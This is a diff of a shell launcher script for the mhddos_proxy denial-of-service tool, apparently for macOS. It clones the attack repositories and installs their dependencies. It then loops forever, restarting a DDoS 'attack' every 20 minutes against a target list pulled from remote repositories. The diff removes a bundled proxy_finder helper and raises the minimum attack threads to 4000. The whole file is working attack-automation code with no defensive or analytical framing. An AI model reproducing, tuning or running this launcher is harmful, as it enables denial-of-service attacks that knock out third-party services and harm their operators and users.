@@ -31,14 +31,9 @@ rm -rf auto_mhddos_mac
 git clone https://github.com/alexnest-ua/auto_mhddos_mac
 rm -rf mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
-rm -rf proxy_finder
-git clone https://github.com/alexnest-ua/proxy_finder.git
 cd ~/mhddos_proxy
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sleep 2
-python3.10 -m pip install -r requirements.txt
-#Install latest version of proxy_finder
-cd ~/proxy_finder
 python3.10 -m pip install -r requirements.txt
 
 restart_interval="1200"
@@ -48,11 +43,11 @@ ulimit -n 1048576 || true
 
 
 
-threads="${1:-2000}"
-if ((threads < 1000));
+threads="${1:-4000}"
+if ((threads < 4000));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
-	threads=1000
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 4000 threads\033[0;0m\n"
+	threads=4000
 elif ((threads > 10000));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 10000 threads\033[0;0m\n"
@@ -81,23 +76,22 @@ then
 fi
 
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters:  -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
-sleep 7
+sleep 5
 
-trap 'echo signal received!; kill "${PID}"; kill "${PID1}"; wait "${PID}"; wait "${PID1}"; ctrl_c' SIGINT SIGTERM
+trap 'echo signal received!; kill "${PID}"; wait "${PID}"; ctrl_c' SIGINT SIGTERM
 
 function ctrl_c() {
         echo "Exiting..."
-	sleep 3s
+	sleep 1
 	exit
 	echo "Exiting failed - close the window with terminal!!!"
-	sleep 60s
+	sleep 60
 }
 
 # Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
 	cd ~/mhddos_proxy
-
 	num0=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
    	echo -e "$num0"
    	
@@ -110,21 +104,6 @@ do
 		clear
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
 		sleep 3
-	fi
-	
-	cd ~/proxy_finder
-
-  	num=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
-	echo "$num"
-   	
-	if ((num == 1));
-	then
-		clear
-		echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date proxy_finder\n\n"
-	else
-		python3.10 -m pip install -r requirements.txt
-		clear
-		echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder\n\n"
 	fi
 	
 	cd ~/auto_mhddos_mac
@@ -162,17 +141,8 @@ do
 	sleep 20
 	
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
-
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval seconds...\033[1;0m"
-	sleep 5
-	
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mStarting our new proxy_finder, next restart in $restart_interval...\033[1;0m"
-	
-	cd ~/proxy_finder
-    	python3.10 finder.py --threads 7500&
-	PID1="$!"
-	
-	
+
    	sleep $restart_interval
 	clear
    	
